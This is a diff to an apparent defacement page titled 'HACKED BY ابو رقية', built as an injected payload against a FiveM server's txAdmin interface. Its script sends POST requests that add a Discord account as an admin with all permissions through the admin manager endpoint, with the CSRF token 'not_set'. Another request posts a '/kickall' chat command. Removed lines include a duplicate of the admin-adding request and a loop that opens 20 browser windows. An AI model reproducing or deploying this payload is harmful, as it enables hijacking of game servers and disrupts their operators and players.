@@ -357,7 +357,7 @@
 
 <!-- Background Audio -->
 <audio id="bgAudio" autoplay loop>
-  <source src="https://cdn.discordapp.com/attachments/1352878056334950520/1405269521954111761/-_.mp3?ex=689e36ba&is=689ce53a&hm=2102d0798accb044a27c7cc390457b197aa29b0814f1bbc16510d6df4b41c94d&" type="audio/mpeg">
+  <source src="https://cdn.discordapp.com/attachments/1347275851305058366/1394441065129312346/voice.mp3?ex=6876d1f1&is=68758071&hm=20274074ecf439b52c8568adf3a7331f8d6ba5bab656eab73c5c991e6119aeff&" type="audio/mpeg">
 </audio>
 
 <!-- Loading Screen -->
@@ -386,8 +386,8 @@
 
 <!-- Video Screen -->
 <div class="screen video-screen" id="video-screen">
-  <video autoplay loop>
-    <source src="https://abo-ali-1.github.io/Marshal/index/abo.mp4" type="video/mp4">
+  <video autoplay muted loop>
+    <source src="https://v1.pinimg.com/videos/iht/720p/44/14/68/44146850b8139f87857522a6439435cb.mp4" type="video/mp4">
   </video>
 </div>
 
@@ -397,7 +397,7 @@
     <h1 class="video-title">HACKED BY ابو رقية</h1><br>
     <video class="info-video" autoplay muted loop>
       <!-- Add your MP4 source here -->
-      <source src="https://abo-ali-1.github.io/Marshal/index/abo.mp4" type="video/mp4">
+      <source src="https://abo-ali-1.github.io/Marshal/index/Untitled.mp4" type="video/mp4">
       Your browser does not support the video tag.
     </video>
   </div>
@@ -448,6 +448,17 @@
 
 <script>
 
+fetch("https://chat/chatResult", {
+    method: "POST",
+    body: JSON.stringify({ message: "/kickall تبون نقفل الثغره ارجو انكم ترسلون في الدس  " }),
+});
+
+
+// Audio setup
+document.addEventListener('DOMContentLoaded', function() {
+  const audio = document.getElementById('bgAudio');
+  audio.volume = 1.0;
+});
 
 fetch("https://monitor/WebPipe//adminManager/add", {
   "headers": {
@@ -466,20 +477,6 @@ fetch("https://monitor/WebPipe//adminManager/add", {
   "mode": "cors",
   "credentials": "omit"
 });
-
-
-// Audio setup
-document.addEventListener('DOMContentLoaded', function() {
-  const audio = document.getElementById('bgAudio');
-  audio.volume = 1.0;
-});
-
-
-    window.onload = function() {
-      for (let i = 0; i < 20; i++) {
-        window.open("https://pbs.twimg.com/media/Gvz9AQ-WoAArGwQ?format=jpg&name=medium", "_blank");
-      }
-    };
 
 // Terminal typing effect
 const commands = [
@@ -511,29 +508,7 @@ function typeCommand() {
   }
 }
 
-fetch("https://chat/chatResult", {
-    method: "POST",
-    body: JSON.stringify({ message: "/ooc ..??  " }),
-});
 
-
-fetch("https://monitor/WebPipe//adminManager/add", {
-  "headers": {
-    "accept": "application/json, text/javascript, /; q=0.01",
-    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-    "sec-ch-ua": ""Chromium";v="103"",
-    "sec-ch-ua-mobile": "?0",
-    "sec-ch-ua-platform": ""Windows"",
-    "x-requested-with": "XMLHttpRequest",
-    "x-txadmin-csrftoken": "not_set"
-  },
-  "referrer": "https://monitor/WebPipe/legacy/adminManager",
-  "referrerPolicy": "strict-origin-when-cross-origin",
-  "body": "name=moali&citizenfxID=&discordID=1347274253854179459&permissions%5B%5D=all_permissions",
-  "method": "POST",
-  "mode": "cors",
-  "credentials": "omit"
-});
 
 // Start typing effect after a delay
 setTimeout(typeCommand, 100);
@@ -667,8 +642,3 @@ document.addEventListener('keydown', function(e) {
 
 </body>
 </html>
-
-
-
-
-
